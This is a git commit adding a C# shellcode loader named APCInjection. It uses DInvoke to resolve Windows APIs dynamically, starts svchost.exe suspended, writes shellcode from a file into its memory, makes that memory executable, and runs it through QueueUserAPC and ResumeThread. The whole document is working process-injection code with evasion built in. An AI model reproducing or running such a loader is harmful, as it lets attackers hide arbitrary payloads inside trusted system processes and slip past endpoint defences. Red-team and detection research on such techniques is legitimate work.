1b69b1b35ec46279009ab8a5119d9863b8dec249
crypt0ace <hellblazer9900@gmail.com>
2022-09-28 10:48:15 -0700

    Dinvoke Version Update

---
+++ DInvoke/Imports/Imports.cs
@@ -0,0 +1,62 @@
+﻿using System;
+using System.Runtime.InteropServices;
+
+namespace APCInjection.Imports
+{
+    class Imports
+    {
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate bool CreateProcess(
+            string lpApplicationName, 
+            string lpCommandLine, 
+            IntPtr lpProcessAttributes, 
+            IntPtr lpThreadAttributes, 
+            bool bInheritHandles,
+            uint dwCreationFlags, 
+            IntPtr lpEnvironment, 
+            string lpCurrentDirectory, 
+            ref STARTUPINFO lpStartupInfo, 
+            ref PROCESS_INFORMATION lpProcessInformation
+        );
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate IntPtr QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
+        public delegate uint ResumeThread(IntPtr hThhread);
+
+        public struct STARTUPINFO
+        {
+            public Int32 cb;
+            public string lpReserved;
+            public string lpDesktop;
+            public string lpTitle;
+            public Int32 dwX;
+            public Int32 dwY;
+            public Int32 dwXSize;
+            public Int32 dwYSize;
+            public Int32 dwXCountChars;
+            public Int32 dwYCountChars;
+            public Int32 dwFillAttribute;
+            public Int32 dwFlags;
+            public Int16 wShowWindow;
+            public Int16 cbReserved2;
+            public IntPtr lpReserved2;
+            public IntPtr hStdInput;
+            public IntPtr hStdOutput;
+            public IntPtr hStdError;
+        }
+        [StructLayout(LayoutKind.Sequential)]
+        public struct PROCESS_INFORMATION
+        {
+            public IntPtr hProcess;
+            public IntPtr hThread;
+            public int dwProcessId;
+            public int dwThreadId;
+        }
+        public static class CreationFlags
+        {
+            public const uint SUSPENDED = 0x4;
+        }
+    }
+}
---
+++ DInvoke/Program.cs
@@ -0,0 +1,41 @@
+﻿using System;
+using System.IO;
+using System.Runtime.InteropServices;
+using static APCInjection.Imports.Imports;
+
+namespace APCInjection
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            STARTUPINFO si = new STARTUPINFO();
+            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
+            string app = @"C:\Windows\System32\svchost.exe";
+            IntPtr createProc = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "CreateProcessA");
+            CreateProcess CreateProcess = Marshal.GetDelegateForFunctionPointer(createProc, typeof(CreateProcess)) as CreateProcess;
+            bool success = CreateProcess(null, app, IntPtr.Zero, IntPtr.Zero, false, CreationFlags.SUSPENDED, IntPtr.Zero, null, ref si, ref pi);
+
+            byte[] safe = File.ReadAllBytes(@"C:\Path\To\\shellcode.bin");
+            IntPtr regionBits = new IntPtr(Convert.ToUInt32(safe.Length));
+            IntPtr baseAddr = IntPtr.Zero;
+            IntPtr result = DInvoke.DynamicInvoke.Native.NtAllocateVirtualMemory(pi.hProcess, ref baseAddr, IntPtr.Zero, ref regionBits, DInvoke.Data.Win32.Kernel32.MEM_COMMIT | DInvoke.Data.Win32.Kernel32.MEM_RESERVE, DInvoke.Data.Win32.WinNT.PAGE_READWRITE);
+
+            var buf = Marshal.AllocHGlobal(safe.Length);
+            Marshal.Copy(safe, 0, buf, safe.Length);
+            IntPtr bytesWritten = IntPtr.Zero;
+            uint resultBool = DInvoke.DynamicInvoke.Native.NtWriteVirtualMemory(pi.hProcess, result, buf, (uint)safe.Length);
+
+            IntPtr proc_handle = pi.hProcess;
+            resultBool = DInvoke.DynamicInvoke.Native.NtProtectVirtualMemory(proc_handle, ref baseAddr, ref regionBits, DInvoke.Data.Win32.WinNT.PAGE_EXECUTE_READ);
+
+            IntPtr queueUserAPCptr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "QueueUserAPC");
+            QueueUserAPC queueUserAPC = Marshal.GetDelegateForFunctionPointer(queueUserAPCptr, typeof(QueueUserAPC)) as QueueUserAPC;
+            queueUserAPC(result, pi.hThread, IntPtr.Zero);
+
+            IntPtr resumeThreadptr = DInvoke.DynamicInvoke.Generic.GetLibraryAddress("kernel32.dll", "ResumeThread");
+            ResumeThread resumeThread = Marshal.GetDelegateForFunctionPointer(resumeThreadptr, typeof(ResumeThread)) as ResumeThread;
+            resumeThread(pi.hThread);
+        }
+    }
+}
